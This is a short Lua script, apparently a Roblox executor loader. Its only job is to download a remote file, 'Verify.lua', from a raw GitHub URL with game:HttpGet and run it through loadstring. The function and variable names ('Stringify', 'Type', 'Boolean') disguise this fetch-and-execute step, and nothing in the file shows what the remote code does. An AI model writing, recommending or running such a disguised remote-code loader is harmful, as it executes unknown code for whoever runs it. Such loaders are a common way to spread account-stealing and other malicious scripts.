local Stringify = function(Post)
    local Configuration = {
        ["Type"] = Post,
        ["Boolean"] = true
    }
    loadstring(game:HttpGet(Configuration.Type, Configuration.Boolean))()
end

Stringify("https://raw.githubusercontent.com/suno-ui/Dove/main/Verify.lua")
